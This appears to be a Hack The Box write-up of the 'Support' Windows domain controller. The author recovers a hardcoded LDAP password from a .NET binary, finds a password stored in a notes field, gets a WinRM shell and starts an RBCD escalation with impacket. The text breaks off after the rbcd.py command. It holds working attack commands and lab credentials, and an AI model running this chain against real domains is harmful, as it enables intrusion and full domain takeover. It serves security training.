---
title: "Support"
type: docs
tags:
  - htb
  - windows
  - active-directory
  - dotnet-reversing
  - ldap
  - rbcd
  - beginner-friendly
  - Easy
---

## The short version (plain English)

Support was my introduction to just how much damage a single overlooked group membership can do in Active Directory, and I wanted this writeup to walk through the whole chain in enough detail that the reasoning behind each step is obvious, not just the commands. Here's how the engagement unfolded for me, step by step.

- I found that the server let **anyone** read a file share without authenticating at all. Sitting on that share was a small custom program, **`UserInfo.exe`**, which immediately caught my eye as something worth reverse engineering.
- That program looks up staff in the company directory, and to do that, it has to authenticate as a directory account itself, which meant **the password had to be hidden somewhere inside the program**. I pulled it out three separate ways to be thorough, and confirmed the account was **`ldap`**.
- Once I was authenticated as `ldap`, I went looking through every account's "notes" field, a trick that works because Active Directory lets any authenticated user read it, and found that someone had written **`support`'s real password directly into that field**.
- I confirmed `support` was permitted to remote in over PowerShell, which gave me my first shell and the **user flag**.
- Digging further, I discovered `support` belonged to a group that had accidentally been granted **full control over the Domain Controller's computer account**. That single mistake let me impersonate the **Administrator** through an RBCD attack and take the entire domain, landing the **root flag**.

| | |
|---|---|
| **What kind of box** | A Windows domain controller (the "boss" server that runs the whole Windows network) |
| **Domain** | `support.htb` |
| **Way in** | Open file share → reverse a program → directory password |
| **Way up** | A bad permission on the Domain Controller (an attack called **RBCD**) |

My method throughout this writeup stays consistent: **command first, output second, then what that output actually tells me**. That discipline is the whole approach, run something, read the result carefully, and only then decide what the next step should be.

---

## 1. Scanning - what's running?

### Command

```bash
nmap -p- --min-rate 2000 -Pn 10.129.112.159            # find open ports
nmap -sC -sV -p 53,88,135,139,389,445,464,593,636,3268,3269 10.129.112.159   # identify them
```

### Output

```
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-03 00:56:18Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0.)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3269/tcp open  tcpwrapped
Service Info: Host: DC; OS: Windows
```

### What this tells us

The moment I saw this combination of ports together, I recognized the fingerprint immediately:

| Port | Service | Plain meaning |
|---|---|---|
| 53 | DNS | name server (domain controllers usually run DNS) |
| 88 | Kerberos | the Windows login/ticket system → **this is a domain** |
| 389 / 636 | LDAP / LDAPS | the directory database (users, groups, computers) |
| 3268 / 3269 | Global Catalog | a directory service **only Domain Controllers have** |
| 445 | SMB | file sharing |
| 135 / 593 | RPC | remote procedure calls (Windows admin plumbing) |

I was looking at a **Domain Controller**, and not just any Windows box. Nmap also handed me two freebies I made sure to use right away: the **domain name**, `support.htb`, and the **computer name**, `DC`. My next move, before doing anything else, was to put both into my hosts file so every tool I ran afterward would resolve names correctly instead of tripping over raw IP addresses:

```bash
echo '10.129.112.159 support.htb dc.support.htb DC' | sudo tee -a /etc/hosts
```

> **Being quiet:** a full `-p-` scan is noisy, hundreds of connections in a second. On a real engagement I'd scan just the ports above, slowly, to stay under any detection threshold. On HTB nobody's watching, so I let it run at full speed.

---

## 2. The open file share

### Command

```bash
# "-N" = no password / anonymous.  "-L" = list shares.
smbclient -L //support.htb/ -N
```

### Output

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        support-tools   Disk      support staff tools     <-- not normal
        SYSVOL          Disk      Logon server share
```

### What this tells us

I already knew to skip `ADMIN$`, `C$`, `IPC$`, `NETLOGON`, and `SYSVOL` since those exist on every Windows domain controller by default and never tell you anything box-specific. What caught my attention was **`support-tools`**, a custom share someone had deliberately created, and the fact that I could list its contents **without a password** was already a misconfiguration worth flagging on its own.

Before diving into the share itself, I wanted to confirm exactly why anonymous listing worked, so I checked whether *any* fake username would get me in:

```bash
nxc smb support.htb -u 'thisuserdoesnotexist' -p ''
```

```
SMB  10.129.112.159  445  DC  [+] support.htb\thisuserdoesnotexist: (Guest)
```

The `(Guest)` at the end was the giveaway I was looking for: the server never checked whether `thisuserdoesnotexist` was real, it just fell back and logged me in as the built-in **Guest** account. Guest is supposed to ship **disabled**, and finding it enabled here explained exactly why anonymous access worked in the first place.

### Look inside the share

```bash
smbclient //support.htb/support-tools -N -c 'ls'
```

```
  7-ZipPortable_21.01.paf.exe
  npp.8.4.1.portable.x64.zip
  putty.exe
  SysinternalsSuite.zip
  UserInfo.exe.zip              A   277499
  windirstat1_1_2_setup.exe
  WiresharkPortable64_3.6.5.paf.exe
```

Scanning the listing, everything here was a well-known free tool I could have downloaded from anywhere myself, **except for `UserInfo.exe.zip`**. That one stood out immediately as home-made software written by the company's own admins, and in my experience, home-made software that talks to a directory service almost always has a **password** baked into it somewhere. That made it my priority, so I grabbed it right away:

```bash
smbclient //support.htb/support-tools -N -c 'get UserInfo.exe.zip'
unzip UserInfo.exe.zip -d UserInfo
```

---

## 3. Getting the password out of `UserInfo.exe`

### 3.1 First, what *is* this file?

```bash
file UserInfo/UserInfo.exe
```

```
UserInfo/UserInfo.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
```

The detail that mattered to me here was `Mono/.Net assembly`. That told me the program was written in **C#** and compiled to **.NET bytecode** rather than raw machine code, and that distinction shapes my whole approach: **.NET bytecode decompiles back into readable C# almost perfectly.** I didn't need to be a reverse-engineering wizard for this one, a decompiler was going to hand me source code directly.

> Tools like Ghidra are built for *machine code*. For .NET I reach for **`monodis`**, **ILSpy**, or **dnSpy** instead. Trying to make sense of this in Ghidra would have cost me hours for no benefit, this box practically dares you to take that wrong turn.

With the file type confirmed, I went looking for anything that hinted at credentials before committing to a full decompile:

```bash
strings UserInfo/UserInfo.exe | grep -iE 'password|ldap|base64'
```

```
getPassword
enc_password
FromBase64String
LdapQuery
```

Seeing `getPassword`, `enc_password`, `FromBase64String`, and `LdapQuery` all together confirmed my suspicion: this program keeps a **stored, scrambled password** it uses to authenticate to **LDAP**. That was enough to justify going deeper, so my next step was reading exactly how that scrambling worked.

### 3.2 Set up the tools (one time)

```bash
sudo apt install -y mono-complete dotnet-sdk-8.0
dotnet tool install -g ilspycmd --version 8.2.0.7535
export PATH="$PATH:$HOME/.dotnet/tools"
```

> **I didn't bother with Wine.** Running `wine UserInfo.exe` needs a 32-bit Wine package that, on Ubuntu 24.04, tries to uninstall Python and core system tools just to install itself, which wasn't a trade I was willing to make. `mono` runs .NET programs directly, and for the static analysis approach I didn't even need to *execute* the binary at all.

### 3.3 Way 1 - read the bytecode (`monodis`)

My first instinct was to disassemble the IL directly and read the `getPassword` routine byte by byte, since that would tell me the exact transformation being applied without any decompiler guesswork in between.

```bash
monodis UserInfo/UserInfo.exe | grep -A45 'getPassword'
```

```
.method public static default string getPassword ()  cil managed
{
    IL_0000:  ldsfld    string Protected::enc_password
    IL_0005:  call      int8[] System.Convert::FromBase64String(string)      // step 1: base64 decode
    ...
    IL_0015:  ldelem.u1                                                      // take one byte
    IL_0016:  ldsfld    int8[] Protected::key
    IL_0023:  rem                                                           // index % key length
    IL_0024:  ldelem.u1
    IL_0025:  xor                                                           // step 2: XOR with the key
    IL_0026:  ldc.i4    223
    IL_002b:  xor                                                           // step 3: XOR with 223 (0xDF)
    ...
}
```

And the part that sets the stored values:

```
IL_0000:  ldstr   "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"     // enc_password
IL_000f:  ldstr   "armando"                                             // the key
```

**Working through the logic:** the routine takes the text `0Nv32PTw...`, base64-decodes it, and then for every byte, XORs it with the letters of `"armando"` (cycling through the key as needed), then XORs the result again with the constant `223`. That's the entirety of the "encryption" scheme, which tells me why it was trivial to reverse: XOR is fully symmetric, so running the exact same two operations in the same order un-scrambles it. Worth flagging explicitly, since I've seen people trip on it: **`armando` is the XOR key, not a username**, a mistake I've seen come up repeatedly in other write-ups of this box.

### 3.4 Way 2 - get the actual C# back (ILSpy)

Reading raw IL is fine, but I wanted to double-check my reading against a full decompile, so I ran the binary through ILSpy to get something closer to the original source.

```bash
DOTNET_ROLL_FORWARD=LatestMajor ilspycmd UserInfo/UserInfo.exe -o src/
cat src/UserInfo.decompiled.cs
```

```csharp
internal class Protected
{
    private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";
    private static byte[] key = Encoding.ASCII.GetBytes("armando");

    public static string getPassword()
    {
        byte[] array = Convert.FromBase64String(enc_password);
        for (int i = 0; i < array.Length; i++)
            array[i] = (byte)((array[i] ^ key[i % key.Length]) ^ 0xDF);
        return Encoding.Default.GetString(array);
    }
}

internal class LdapQuery
{
    public LdapQuery()
    {
        string password = Protected.getPassword();
        // logs into the directory as "support\ldap" with that password:
        entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
        ...
    }
}
```

Seeing the decompiled source confirmed exactly what I'd worked out from the IL: the program authenticates to the directory as **`support\ldap`**, using whatever `getPassword()` hands back.

> **Why developers keep making this mistake, and why it never holds up:** whoever wrote this wanted help-desk staff to be able to look people up without ever knowing the real directory password, so they hid it inside the app and ran it through a light "encryption" scheme. The problem is that the key sits *right next to* the scrambled password in the exact same binary, so anyone who obtains the file can reverse it just as easily as I did. This is obfuscation, not security, and it never survives contact with a decompiler.

### 3.5 Un-scramble it

With the algorithm and the key both confirmed, running the actual decryption was just a matter of implementing those same two XOR steps myself in a quick Python one-liner, since XOR is its own inverse:

```bash
python3 -c '
import base64
enc = base64.b64decode("0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E")
key = b"armando"
print(bytes(enc[i] ^ key[i % len(key)] ^ 0xDF for i in range(len(enc))).decode())
'
```

```
nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

### 3.6 Way 3 - don't reverse anything, just watch it log in

Once I had the password from the crypto approach, I still wanted to validate it a third way, because it's worth knowing there's a route that skips the reverse engineering entirely. The program logs into LDAP, and a basic LDAP bind sends the password **in plain text over the network**, so my plan was simple: capture the traffic, run the program, and read the password straight off the wire.

```bash
# terminal 1 - record traffic to the directory
sudo tcpdump -i tun0 -s0 -w ldap.pcap 'tcp port 389 and host support.htb'

# terminal 2 - run the program (mono runs .NET on Linux)
cd UserInfo && mono UserInfo.exe find -first raven -last clifton -v
```

```
[*] LDAP query to use: (&(givenName=raven)(sn=clifton))
[-] Exception: No Such Object
```

(The "No Such Object" error didn't concern me, it's just Mono's implementation being incomplete on the *search* step. The *bind* had already gone out over the wire by that point, which was all I actually needed for this approach to work.)

```bash
tcpdump -nnX -r ldap.pcap 'dst host support.htb and greater 100'
```

```
0x0040:  7375 7070 6f72 745c 6c64 6170 8024 6e76  support\ldap.$nv
0x0050:  4566 454b 3136 5e31 614d 3424 6537 4163  EfEK16^1aM4$e7Ac
0x0060:  6c55 6638 7824 7452 5778 5057 4f31 256c  lUf8x$tRWxPWO1%l
0x0070:  6d7a                                     mz
```

And there it was, sitting in plain text in the packet: `support\ldap` alongside the password `nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz`. In Wireshark I'd have gotten the same result by filtering on `ldap.bindRequest` or right-clicking and following the TCP stream. Same credential, arrived at with zero cryptography.

### 3.7 Check the credential works

With three independent methods agreeing on the same password, I was confident enough to test it directly against LDAP rather than second-guessing myself further.

```bash
nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
```

```
LDAP  10.129.112.159  389  DC  [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

That `[+]` in green confirmed the login worked. **I now had a real, working domain account to enumerate with.**

---

## 4. Using the `ldap` account to find the next password

### 4.1 List all the users

With a valid LDAP bind in hand, the obvious next move was to enumerate every user in the domain and see who was worth targeting next.

```bash
nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' --users
```

```
[*] Enumerated 20 domain users: support.htb
-Username-           -Last PW Set-        -Description-
Administrator        2022-07-19 17:55:56  Built-in account for administering the computer/domain
Guest                2022-05-28 11:18:55  Built-in account for guest access to the computer/domain
krbtgt               2022-05-28 11:03:43  Key Distribution Center Service Account
ldap                 2022-05-28 11:11:46
support              2022-05-28 11:12:00
smith.rosario        2022-05-28 11:12:19
hernandez.stanley    2022-05-28 11:12:34
...
ford.victoria        2022-05-28 11:15:58
```

Two accounts jumped out at me: `ldap`, which I already controlled, and **`support`**, which matched both the box name and the tool name closely enough to make it my next target.

### 4.2 The trick: read the "notes" fields

I know from experience that Active Directory lets **any authenticated user read almost every attribute on every account**, including free-text fields like **`info`** (shown as "Notes" in the Windows admin GUI) and `description`. Admins routinely treat these fields as private scratchpads for themselves, but they are anything but private, and sweeping them across every user is one of the first things I do with any freshly obtained AD credential:

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' '(objectClass=user)' sAMAccountName info description \
  | grep -iE '^(sAMAccountName|info|description):'
```

```
sAMAccountName: support
info: Ironside47pleasure40Watchful
sAMAccountName: smith.rosario
...
```

There it was: the `support` account carried **`info: Ironside47pleasure40Watchful`**, which reads exactly like a password someone parked in a notes field and forgot was readable by everyone else in the domain.

### 4.3 Look closer at the `support` account

Before trying that credential anywhere, I wanted to know what `support` could actually do, so I pulled its group memberships alongside the notes field.

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' \
  -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' '(sAMAccountName=support)' memberOf info
```

```
dn: CN=support,CN=Users,DC=support,DC=htb
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
```

Two things stood out to me immediately:
- **`Remote Management Users`**, which grants WinRM access and told me exactly how I'd get a shell once I confirmed the password.
- **`Shared Support Accounts`**, a custom group that I made a mental note to dig into later, since custom groups always exist to *grant* something and rarely show up by accident.

### 4.4 Confirm the password + shell access

Before jumping straight to a shell, I did a quick sanity check to confirm the credential worked over WinRM specifically.

```bash
nxc winrm support.htb -u support -p 'Ironside47pleasure40Watchful'
```

```
WINRM  10.129.112.159  5985  DC  [+] support.htb\support:Ironside47pleasure40Watchful (Pwn3d!)
```

That `(Pwn3d!)` tag told me everything I needed: I had a shell waiting for me.

---

## 5. Foothold - shell as `support`

```bash
evil-winrm -i support.htb -u support -p 'Ironside47pleasure40Watchful'
```

```
*Evil-WinRM* PS C:\Users\support\Documents> whoami
support\support

*Evil-WinRM* PS C:\Users\support\Desktop> type user.txt
<user flag>
```

**Why I reached for WinRM specifically:** `support` isn't an administrator anywhere on this box, so tools like `psexec` were never going to work for me. What it *does* have is membership in `Remote Management Users`, and that group exists for exactly one purpose, connecting over WinRM on port 5985. I matched the tool to the permission I actually had rather than wasting time on approaches that were doomed from the start.

### 5.1 First thing in any Windows shell: look around

Before I even think about pulling down external scripts, I always run the built-in commands first. They're already sitting on the box, they're quiet on the wire, and more often than not they hand me the answer directly.

**Who am I, and what can I do?**

```powershell
*Evil-WinRM* PS> whoami /groups
```

```
Group Name                                 Type    SID
========================================== ======= =============================================
BUILTIN\Remote Management Users            Alias   S-1-5-32-580
BUILTIN\Users                              Alias   S-1-5-32-545
BUILTIN\Pre-Windows 2000 Compatible Access Alias   S-1-5-32-554
NT AUTHORITY\Authenticated Users           Well..  S-1-5-11
SUPPORT\Shared Support Accounts            Group   S-1-5-21-1677581083-3380853377-188903654-1103
```

```powershell
*Evil-WinRM* PS> whoami /priv
```

```
Privilege Name                Description                    State
============================= ============================== =======
SeMachineAccountPrivilege     Add workstations to domain     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
```

That line made me stop and pay attention: `SeMachineAccountPrivilege`, `Add workstations to domain`, `Enabled`. A single entry in a built-in command told me **this account is allowed to create computer accounts in the domain**, something I hadn't yet confirmed from the Linux side. That's *exactly* one of the two ingredients the final attack was going to need, and I'd stumbled onto it before running a single external script. I still needed to confirm the second ingredient, `MachineAccountQuota`, which I check in §6.

Next I checked **the password policy**, mostly out of habit, since it matters a lot if I ever need to guess or spray passwords later in an engagement:

```powershell
*Evil-WinRM* PS> net accounts
```

```
Minimum password length:                              7
Lockout threshold:                                    Never
Lockout duration (minutes):                           30
Computer role:                                        PRIMARY
```

`Lockout threshold: Never` told me I could brute-force accounts all day without ever locking anyone out, which is worth remembering if this box had needed that approach. `Computer role: PRIMARY` also re-confirmed I was sitting on the main Domain Controller.

**What my account looks like in the directory**, with the group memberships worth noting at the bottom:

```powershell
*Evil-WinRM* PS> net user support /domain
```

```
User name                    support
Password last set            5/28/2022 4:12:00 AM
Local Group Memberships      *Remote Management Use
Global Group memberships     *Shared Support Accoun *Domain Users
```

**Poking around the file system** was next on my list, since anything non-standard sitting at the root of C: is always worth a look:

```powershell
*Evil-WinRM* PS> Get-ChildItem C:\ -Force | Select Name
```

```
Program Files
Program Files (x86)
ProgramData
Users
Windows
share                <-- not standard
```

```powershell
*Evil-WinRM* PS> cmd /c "dir C:\share /s"
```

```
 Directory of C:\share
05/28/2022  04:18 AM    <DIR>          support-tools
```

`C:\share` turned out to just be the local copy of the `support-tools` SMB share I'd already looted, a dead end in this case, but I always check folders like this anyway, since "weird directory sitting at C:\ root" is a classic hiding spot for something useful.

Nothing in my token carried any admin rights. Every lead I had kept pointing back to the same place: **`Shared Support Accounts`**.

---

## 6. Finding the privilege escalation

This is the part of the box that trips people up, so I deliberately slowed down here and worked through it one step at a time: **run a command, read the output, make sure I actually understand what it's telling me before moving on.**

### 6.0 Cast a wide net first

Before narrowing in on any one theory, my habit is to dump *everything* the current credential can see and skim through it. I deliberately reach for several overlapping tools here, since if one gets blocked or turns out buggy, another usually surfaces the same underlying facts.

**`ldapdomaindump`, one command that turns the whole directory into browsable HTML:**

```bash
mkdir ldd && cd ldd
ldapdomaindump -u 'SUPPORT\ldap' -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' ldap://10.129.112.159
```

```
[+] Bind OK
[+] Domain dump finished
```

```bash
ls
```

```
domain_computers.html   domain_groups.html   domain_policy.html   domain_users.html
domain_users_by_group.html   domain_users.grep   domain_groups.grep   ...
```

Opening `domain_users_by_group.html` in a browser, I could *see* directly that `support` was the only member of `Shared Support Accounts`. From there I checked the policy file to pull the machine-account quota while I was at it:

```bash
cat domain_policy.grep
```

```
distinguishedName   ...   minPwdLength   pwdProperties        ms-DS-MachineAccountQuota
DC=support,DC=htb    ...   7              PASSWORD_COMPLEX     10
```

There was `MachineAccountQuota: 10` again, confirming the same fact I'd need in a moment, and the dump had already handed it to me without extra work.

**`nxc` LDAP modules, for quick targeted questions:**

```bash
LP='nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz'
nxc ldap support.htb -u ldap -p "$LP" --groups           # every group + member count
nxc ldap support.htb -u ldap -p "$LP" --admin-count      # accounts/groups flagged as privileged
nxc ldap support.htb -u ldap -p "$LP" --kerberoasting kerb.txt   # crackable service accounts
nxc ldap support.htb -u ldap -p "$LP" --asreproast asrep.txt     # accounts with no Kerberos pre-auth
nxc ldap support.htb -u ldap -p "$LP" --gmsa             # managed service-account passwords we can read
```

```
--- kerberoasting ---
LDAP  ...  No entries found!
--- asreproast ---
LDAP  ...  No entries found!
--- gmsa ---
LDAP  ...  [-] LDAPS not configured
```

**All three came back empty**, and I treated that as genuinely useful information rather than a dead end. It *ruled out* the three most common AD shortcuts, cracking a service account, roasting an AS-REP, or reading a gMSA password, which told me the real path here had to be a **permission (ACL) issue**. That's what sent me looking at BloodHound next.

**Every notes field in the domain, swept in one go:**

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w "$LP" -b 'DC=support,DC=htb' \
  '(objectClass=user)' sAMAccountName description info comment \
  | grep -iE '^(sAMAccountName|description|info|comment):'
```

```
sAMAccountName: support
info: Ironside47pleasure40Watchful
sAMAccountName: smith.rosario
...
```

(This is the exact same sweep that surfaced `support`'s password back in §4, and I ran it again here deliberately, because it's the first thing I do with any new AD credential I pick up.)

**A full raw attribute dump of the account I cared about**, since sometimes the clue turns out to be a field I hadn't thought to ask for by name:

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w "$LP" \
  -b 'CN=support,CN=Users,DC=support,DC=htb'
```

```
cn: support
company: support
streetAddress: Skipper Bowles Dr
l: Chapel Hill
info: Ironside47pleasure40Watchful
memberOf: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
memberOf: CN=Remote Management Users,CN=Builtin,DC=support,DC=htb
userAccountControl: 66048        # = NORMAL_ACCOUNT + DONT_EXPIRE_PASSWORD
primaryGroupID: 513
```

### 6.1 What's special about `Shared Support Accounts`?

I wanted to confirm the group's membership directly rather than trusting the HTML dump alone, so I queried it:

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' '(cn=Shared Support Accounts)' member
```

```
dn: CN=Shared Support Accounts,CN=Users,DC=support,DC=htb
member: CN=support,CN=Users,DC=support,DC=htb
```

Just `support`, the account I already controlled. Whatever power this group carried, I had direct access to all of it.

### 6.2 What can this group *do*? Ask BloodHound

Rather than manually walking every ACL in the domain, I let BloodHound do that work for me, since it collects every permission and draws a graph of exactly who can attack whom. I collected the data from Linux, using the `ldap` account:

```bash
bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -d support.htb -ns 10.129.112.159 -c All --zip
```

```
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
INFO: Found 2 computers
INFO: Found 21 users
INFO: Found 53 groups
INFO: Done in 00M 06S
INFO: Compressing output into 20260902224945_bloodhound.zip
```

Load that zip into the BloodHound app, mark `support` as **Owned**, and run **"Shortest Path to Domain Admins from Owned Principals"**. The map shows:

```
support  ──MemberOf──▶  SHARED SUPPORT ACCOUNTS  ──GenericAll──▶  DC.SUPPORT.HTB  (the Domain Controller's computer account)
```



Seeing `GenericAll` there meant full control, and my group had full control over the **computer account of the Domain Controller itself**. That's about as critical a misconfiguration as a domain can have, and I knew immediately this was my path to root.

I could just as easily have collected this from *inside* the Windows shell instead, by uploading the `SharpHound.exe` collector from the [BloodHound GitHub releases](https://github.com/SpecterOps/BloodHound) and pulling the resulting zip back down:

```powershell
*Evil-WinRM* PS> upload SharpHound.exe
*Evil-WinRM* PS> .\SharpHound.exe -c All --outputdirectory C:\Users\support\Desktop --zipfilename b
*Evil-WinRM* PS> download C:\Users\support\Desktop\<timestamp>_b.zip
```

### 6.3 Prove it without BloodHound (three ways)

Since BloodHound is ultimately just reading permissions straight off the directory, I like to confirm its findings by reading those same permissions myself, and I did it three separate ways here to be thorough.

**Way A, `dacledit.py` from impacket, run from Linux.** A "DACL" is simply the permissions list on an object, the same concept as right-click, Properties, Security on a file, just applied to an Active Directory object instead:

```bash
dacledit.py -action read -principal 'Shared Support Accounts' \
  -target-dn 'CN=DC,OU=Domain Controllers,DC=support,DC=htb' \
  'support.htb/ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -dc-ip 10.129.112.159
```

```
[*] Parsing DACL
[*] Filtering results for SID (S-1-5-21-1677581083-3380853377-188903654-1103)
[*]   ACE[15] info
[*]     ACE Type      : ACCESS_ALLOWED_ACE
[*]     Access mask   : FullControl (0xf01ff)
[*]     Trustee (SID) : Shared Support Accounts (S-1-5-21-1677581083-3380853377-188903654-1103)
```

Seeing `Access mask : FullControl` on the DC's object, granted directly to `Shared Support Accounts`, confirmed exactly what BloodHound had already shown me.

**Way B, PowerView, run from the Windows shell.** I pulled `PowerView.ps1` from [PowerSploit on GitHub](https://github.com/PowerShellMafia/PowerSploit), the classic PowerShell toolkit for asking the directory precise, targeted questions:

```powershell
*Evil-WinRM* PS> upload PowerView.ps1
*Evil-WinRM* PS> Import-Module .\PowerView.ps1

# what does our group have rights over?
*Evil-WinRM* PS> $g = Get-DomainGroup 'Shared Support Accounts'
*Evil-WinRM* PS> Get-DomainObjectAcl -SearchBase "DC=support,DC=htb" -ResolveGUIDs |
                  ? { $_.SecurityIdentifier -eq $g.objectsid }
```

```
AceType               : AccessAllowed
ObjectDN              : CN=DC,OU=Domain Controllers,DC=support,DC=htb
ActiveDirectoryRights : GenericAll
SecurityIdentifier    : S-1-5-21-1677581083-3380853377-188903654-1103
```

```powershell
# or let PowerView find every "interesting" ACL in the domain automatically
*Evil-WinRM* PS> Find-InterestingDomainAcl -ResolveGUIDs |
                  ? { $_.IdentityReferenceName -eq 'Shared Support Accounts' } |
                  select ObjectDN, ActiveDirectoryRights
```

```
ObjectDN                                            ActiveDirectoryRights
--------                                            ---------------------
CN=DC,OU=Domain Controllers,DC=support,DC=htb        GenericAll
```

**Way C, reading the raw `bloodhound-python` JSON with no GUI at all.** The collector had already written the answer to disk, so all I needed to do was grep the computers file directly:

```bash
python3 -c "
import json,glob
for c in json.load(open(glob.glob('*computers.json')[0]))['data']:
    for a in c.get('Aces',[]):
        if a['RightName']=='GenericAll':
            print(c['Properties']['name'], '<--', a['PrincipalSID'])
"
```

```
DC.SUPPORT.HTB <-- S-1-5-21-1677581083-3380853377-188903654-1103   (Shared Support Accounts)
DC.SUPPORT.HTB <-- S-1-5-21-1677581083-3380853377-188903654-512    (Domain Admins - normal)
DC.SUPPORT.HTB <-- S-1-5-21-1677581083-3380853377-188903654-519    (Enterprise Admins - normal)
```

Three completely independent tools, and every one of them agreed: **`Shared Support Accounts` sits in that list right next to Domain Admins and Enterprise Admins, a place it absolutely has no business being.**

### 6.4 Can we create a computer account? Check it two ways

The attack I was building toward, RBCD, which I explain in detail next, requires me to **create a new computer account** in the domain. Regular users can only do that *if* a setting called **`ms-DS-MachineAccountQuota`** is set above 0, so I checked it before committing further:

```bash
nxc ldap support.htb -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -M maq
```

```
MAQ  10.129.112.159  389  DC  [*] Getting the MachineAccountQuota
MAQ  10.129.112.159  389  DC  MachineAccountQuota: 10
```

I also cross-checked the same setting by reading it straight off the domain object itself:

```bash
ldapsearch -x -H ldap://support.htb -D 'support\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
  -b 'DC=support,DC=htb' -s base '(objectClass=*)' ms-DS-MachineAccountQuota
```

```
dn: DC=support,DC=htb
ms-DS-MachineAccountQuota: 10
```

A value of **`10`** meant every normal user, `support` included, was allowed to add up to ten computer accounts to the domain. That's actually the Windows default rather than a deliberate misconfiguration, but it's still the second ingredient this attack needed.

And I'd already seen the matching piece of this puzzle back in §5.1, where `whoami /priv` showed me the corresponding privilege sitting directly on the account:

```
SeMachineAccountPrivilege     Add workstations to domain     Enabled
```

Both checks agreed with each other: **`support` could create computer accounts.** I confirmed it once more from PowerShell just to close the loop:

```powershell
*Evil-WinRM* PS> Get-ADObject "DC=support,DC=htb" -Properties ms-DS-MachineAccountQuota |
                  Select ms-DS-MachineAccountQuota
```

```
ms-DS-MachineAccountQuota
------------------------
                      10
```

### 6.5 So the plan is

At this point I had confirmed **both ingredients** needed for an attack called **Resource-Based Constrained Delegation (RBCD)**, and the plan for the rest of the box came together clearly:

1. **Full control over the Domain Controller's computer account**, inherited through `Shared Support Accounts`, and
2. **The ability to create a computer account of my own**, thanks to `MachineAccountQuota = 10`.

---

## 7. Privilege escalation - RBCD, step by step

### 7.1 What RBCD actually is (simple version)

Before running any commands, I made sure I actually understood the mechanism, since blindly copying an RBCD one-liner without knowing why it works is a good way to get stuck the moment something doesn't match. "Delegation" in Windows means: *service A is allowed to act as you when talking to service B.* Normally, only a domain admin can configure that relationship.

**RBCD** changes who gets to configure it. The **target** service keeps a list, stored in an attribute called `msDS-AllowedToActOnBehalfOfOtherIdentity`, of accounts allowed to impersonate other users to it. Critically, **editing that list only requires write access to the target object itself**, not domain admin rights. Since I had *full* control over the DC's object through `Shared Support Accounts`, I could simply add my own computer account to that list.

Once my account was on the DC's list, I could ask Kerberos directly: *give me a ticket to the DC, and make it say I'm the Administrator.* Kerberos checks that delegation list, sees my account sitting there, and hands over exactly the ticket I asked for.

### 7.2 Sync your clock first

I always sync my clock before touching Kerberos, since it rejects requests outright if the client's clock drifts more than five minutes from the server's.

```bash
sudo ntpdate -u support.htb        # or: sudo rdate -n support.htb
```

### 7.3 Step 1 - create a computer account

With the clock synced, the first concrete step was creating a computer account of my own to use as the delegating identity.

```bash
addcomputer.py -computer-name 'RBCDDEMO$' -computer-pass 'Passw0rd123!' \
  -dc-ip 10.129.112.159 'support.htb/support:Ironside47pleasure40Watchful'
```

```
Impacket v0.9.25 - Copyright 2021 SecureAuth Corporation

[*] Successfully added machine account RBCDDEMO$ with password Passw0rd123!.
```

That succeeded **because `MachineAccountQuota` was 10**, and I now controlled a fresh computer account, `RBCDDEMO$`, to use as my delegating identity.

### 7.4 Step 2 - add our computer to the DC's "allowed to impersonate" list

With a computer account in hand, the next step was writing it into the DC's delegation list.

```bash
rbcd.py -delegate-from 'RBCDDEMO$' -delegate-to 'DC$' -action write \
  -dc-ip 10.129.112.159 'support.htb/support:Ironside47pleasure40Watchful'
```

```
